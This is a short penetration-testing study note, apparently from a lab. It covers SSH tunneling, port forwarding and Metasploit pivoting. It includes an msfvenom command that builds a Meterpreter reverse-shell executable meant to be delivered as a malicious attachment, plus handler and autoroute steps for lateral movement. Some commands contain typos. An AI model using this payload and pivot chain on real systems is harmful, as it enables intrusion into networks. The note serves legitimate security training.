# Tunneling, Port Forwarding, Pivoting, & Exfiltration

## Tunneling

Where one protocol is used to carry traffic for another protocol.

### SSH Tunneling

#### 3 Types

1. Local port forwarding
2. Remote port forwarding
3. Dynamic port forwarding

#### Local Port Forwarding

If we look at our local Kali host `http://127.0.0.1:8080` nothing is currently running there.

Now use SSH to connect to my target server on port 80, but access it on port 8080 locally.

```bash
# From Kali
ssh -f -nNT -L 8080:localhost:80 target_user@target_IP
ssh -f -nNT -L 8080:localhost:80 msfadmin@10.0.2.8
```

Should now be able to navigate to `http://127.0.0.1:8080` and see the target's web page.

We can use `lsof` to kill it: `lsof -i` and kill the PID of the process.

#### Remote Port Forwarding

```bash
# From Target
sudo ssh -R 2222:localhost:22 kali@kali_IP
# From Kali
ssh target_IP -p 2222
```

#### Running HTTP through an SSH Tunnel

```bash
# From Target
sudo ssh -f -nNT -R 8080:localhost:80 msfadmin@10.0.2.8
# From Kali
# Can now navigate to 10.0.2.8 in a browser. Was not available prior.
```

#### Dynamic Port Forwarding

```bash
# From Kali
ssh -f - N -D 9050 kali@intermediate_IP  # Dual homed with second IP of 10.1.1.7
proxychains ssh 10.1.1.5  # Target IP
```

## Port Forwarding

Forwarding an incoming IP:port to an outoging IP:port.

## Pivoting

Technique used to burrow deep into a network by routing one machine to another.

### Armitage

```bash
# Setup Meterpreter revere shell
msfvenom -p windows/meterpreter/reverse_tcp --platform windows --arch x86 -f exe LHOST=<IP> LPORT=<IP> -o winjan.exe
# From Armitage
# Add target host, select payload, windows, meterpreter, reverse_tcp, remove encoding, and update the port
# Now wait for a victim to click the malicious attachment winjan.exe
# Arimtage has detected and exploited it
# Right click on the target to select meterpreter, pivoting, setup, and see additional hosts
# We can now scan the new target(s). Select Hosts, MSFscans, and enter range
```

### Metasploit

```bash
msf > use exploit/multi/handler
msf > set payload windos/meterpreter/reverse_tcp
msf > set lhsot
msf > set lport
msf > exploit
# Now execute the winjan.exe file from the target like with Armitage
# We now have a meterpreter reverse shell and can check the network configuration
meterpreter > shell
C:\tools>ipconfig
exit
meterpreter > background
msf exploit(multi/handler) > use post/multi/manage/autoroute
msf post(multi/manage/autoroute) > set subnet 10.1.1.0
msf post(multi/manage/autoroute) > set session 1
msf post(multi/manage/autoroute) > exploit
# We can now pivot by scanning one of the new targets
msf auxiliary(scanner/ssh/ssh_version) > set rhosts 10.1.1.5
msf auxiliary(scanner/ssh/ssh_version) > exploit
```

## Exfiltration

Various ways to get information out of the network.
